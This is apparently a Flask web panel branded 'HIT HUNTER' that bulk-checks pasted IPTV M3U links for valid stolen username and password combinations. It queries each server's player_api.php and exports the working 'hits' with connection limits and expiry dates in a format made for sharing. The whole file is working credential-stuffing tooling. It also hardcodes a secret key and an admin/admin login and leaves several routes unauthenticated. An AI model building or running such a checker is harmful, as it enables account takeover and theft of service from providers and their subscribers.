from flask import Flask, render_template, request, jsonify, redirect, session, send_file
import requests, time
from datetime import datetime
from db import get_db, init_db

app = Flask(__name__)
app.secret_key = "secret123"

init_db()

# ===== USER =====
db = get_db()
try:
    db.execute("INSERT INTO users (user,pass) VALUES (?,?)", ("admin","admin"))
    db.commit()
except:
    pass

# ===== LOGIN =====
@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        user = request.form["user"]
        password = request.form["pass"]

        db = get_db()
        u = db.execute("SELECT * FROM users WHERE user=? AND pass=?",(user,password)).fetchone()

        if u:
            session["user"] = user
            return redirect("/")

    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

def auth():
    return "user" in session

# ===== FORMATEAR FECHA =====
def fmt_fecha(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime('%d/%m/%Y')
    except:
        return "N/A"

# ===== FORMATO FINAL =====
def format_ok(c):
    return f"""╭───✦ HIT HUNTER
├● 👑 ᴜꜱᴇʀ : {c['user']}
├● 🔐 ᴩᴀꜱꜱ : {c['pass']}
├● ✅ ꜱᴛᴀᴛᴜꜱ : Active
├● 📶 ᴀᴄᴛɪᴠᴇ : {c['active']}
├● 📡 ᴍᴀx : {c['max']}
├● ⏰ ᴄʀᴇᴀᴛᴇᴅ : {c['created']}
├● 📅 ᴇxᴘɪʀᴀᴛɪᴏɴ : {c['exp']}
├● 🌐 ꜱᴇʀᴠᴇʀ : {c['server']}
├● 🕰️ ᴛɪᴍᴇᴢᴏɴᴇ : {c['timezone']}
├● ⚡ ꜱᴄᴀɴᴛʏᴩᴇ : combo scanner
├● 👤 нιт вʏ : PANEL PRO
╰───✦ 🚀

🌐 ᴍ3ᴜ : {c['url']}
"""

# ===== VERIFICACIÓN MEJORADA =====
def verificar(url):
    try:
        base = url.split("/get.php")[0]
        user = url.split("username=")[1].split("&")[0]
        password = url.split("password=")[1].split("&")[0]

        api = f"{base}/player_api.php?username={user}&password={password}"

        r = requests.get(api, timeout=6)

        if r.status_code != 200:
            return ("ERROR","❌ SIN RESPUESTA")

        data = r.json()

        info = data.get("user_info", {})
        server = data.get("server_info", {})

        if info.get("auth") != 1:
            return ("BAD","❌ INVALIDA")

        c = {
            "user": user,
            "pass": password,
            "active": info.get("active_cons", "0"),
            "max": info.get("max_connections", "0"),
            "created": fmt_fecha(info.get("created_at")),
            "exp": fmt_fecha(info.get("exp_date")),
            "server": base,
            "timezone": server.get("timezone","N/A"),
            "url": url
        }

        return ("OK", format_ok(c))

    except:
        return ("ERROR","❌ ERROR")

# ===== HOME =====
@app.route("/")
def home():
    if not auth():
        return redirect("/login")
    return render_template("index.html")

# ===== ADD =====
@app.route("/add", methods=["POST"])
def add():
    urls = request.json["urls"].split("\n")
    db = get_db()

    for url in urls:
        url = url.strip()
        if url:
            db.execute("INSERT INTO listas (url,estado) VALUES (?,?)",(url,"NEW"))

    db.commit()
    return jsonify({"ok":True})

# ===== VERIFICAR MÁS RÁPIDO =====
@app.route("/verificar")
def scan():
    db = get_db()
    listas = db.execute("SELECT * FROM listas").fetchall()

    for l in listas:
        db.execute("UPDATE listas SET estado='RUN' WHERE id=?", (l[0],))
        db.commit()

        estado, resultado = verificar(l[1])

        db.execute("UPDATE listas SET estado=?, resultado=? WHERE id=?",
                   (estado, resultado, l[0]))
        db.commit()

        time.sleep(0.3)  # 🔥 MÁS RÁPIDO (antes 1s)

    return jsonify({"ok":True})

# ===== RESULTS =====
@app.route("/results")
def results():
    db = get_db()
    listas = db.execute("SELECT * FROM listas").fetchall()

    return jsonify([
        {"estado": l[2], "resultado": l[3]}
        for l in listas
    ])

# ===== EXPORT TXT =====
@app.route("/export")
def export():
    db = get_db()
    listas = db.execute("SELECT * FROM listas WHERE estado='OK'").fetchall()

    with open("validas.txt","w",encoding="utf-8") as f:
        for l in listas:
            f.write(l[3] + "\n\n")

    return send_file("validas.txt", as_attachment=True)

if __name__ == "__main__":
    app.run()
